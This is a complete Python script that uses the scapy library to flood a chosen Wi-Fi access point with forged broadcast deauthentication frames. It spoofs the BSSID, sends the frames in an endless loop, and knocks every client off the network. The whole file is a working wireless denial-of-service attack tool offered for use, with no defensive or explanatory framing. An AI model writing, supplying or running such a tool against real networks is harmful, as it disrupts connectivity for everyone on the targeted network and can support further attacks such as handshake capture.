#!/usr/bin/env python

import sys
import logging
import scapy.all as scapy

logging.getLogger('scapy.runtime').setLevel(logging.ERROR)


def broadcast_flood(interface, bssid):
    packet = scapy.Dot11(
        addr1='ff:ff:ff:ff:ff:ff',
        addr2=bssid,
        addr3=bssid
    ) / scapy.Dot11Deauth()

    scapy.sendp(packet, iface=interface, loop=1, verbose=0)


def main():
    if len(sys.argv) != 3:
        print('%s <Interface> <BSSID>' % sys.argv[0])
        sys.exit(1)

    print('Flooding is started...')
    broadcast_flood(sys.argv[1], sys.argv[2])


if __name__ == '__main__':
    main()
